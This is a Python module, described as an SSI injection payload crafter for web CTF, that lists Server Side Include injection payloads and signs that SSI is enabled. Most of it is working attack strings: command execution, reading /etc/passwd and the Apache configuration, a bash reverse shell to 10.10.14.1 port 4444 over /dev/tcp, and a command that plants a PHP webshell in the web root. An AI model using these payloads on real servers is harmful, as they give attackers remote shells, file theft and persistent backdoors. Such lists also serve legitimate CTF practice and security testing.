"""
Server Side Include (SSI) Injection Payload Crafter for Web CTF.
Covers SSI directives for command execution, file inclusion, and data exfiltration.
"""

from typing import List, Dict


def get_ssi_payloads() -> List[Dict[str, str]]:
    """Generate Server Side Include (SSI) injection payloads."""
    return [
        {
            "name": "Command Execution",
            "payload": "<!--#exec cmd=\"id\" -->",
            "desc": "Executes system command via SSI exec directive."
        },
        {
            "name": "Command Execution (whoami)",
            "payload": "<!--#exec cmd=\"whoami\" -->",
            "desc": "Executes whoami via SSI."
        },
        {
            "name": "File Inclusion",
            "payload": "<!--#include file=\"/etc/passwd\" -->",
            "desc": "Includes arbitrary file via SSI include directive."
        },
        {
            "name": "Virtual File Inclusion",
            "payload": "<!--#include virtual=\"/etc/passwd\" -->",
            "desc": "Includes virtual file via SSI."
        },
        {
            "name": "Environment Variable Disclosure",
            "payload": "<!--#echo var=\"DOCUMENT_ROOT\" -->",
            "desc": "Discloses environment variables via SSI echo."
        },
        {
            "name": "Date/Time Disclosure",
            "payload": "<!--#echo var=\"DATE_LOCAL\" -->",
            "desc": "Discloses server date/time via SSI."
        },
        {
            "name": "Reverse Shell via SSI",
            "payload": "<!--#exec cmd=\"bash -i >& /dev/tcp/10.10.14.1/4444 0>&1\" -->",
            "desc": "Reverse shell via SSI exec."
        },
        {
            "name": "File Write via SSI",
            "payload": "<!--#exec cmd=\"echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php\" -->",
            "desc": "Writes webshell via SSI exec."
        },
        {
            "name": "Config Disclosure",
            "payload": "<!--#include file=\"/etc/apache2/apache2.conf\" -->",
            "desc": "Includes Apache config via SSI."
        },
        {
            "name": "Log Poisoning via SSI",
            "payload": "<!--#exec cmd=\"cat /var/log/apache2/access.log\" -->",
            "desc": "Reads access log via SSI."
        }
    ]


def get_ssi_indicators() -> List[Dict[str, str]]:
    """Indicators that SSI injection is possible."""
    return [
        {
            "indicator": ".shtml extension",
            "desc": "If the app serves .shtml files, SSI may be enabled."
        },
        {
            "indicator": "SSI directives reflected",
            "desc": "If SSI directives are processed (not shown literally)."
        },
        {
            "indicator": "Apache with SSI enabled",
            "desc": "If Apache has SSI (mod_include) enabled."
        }
    ]
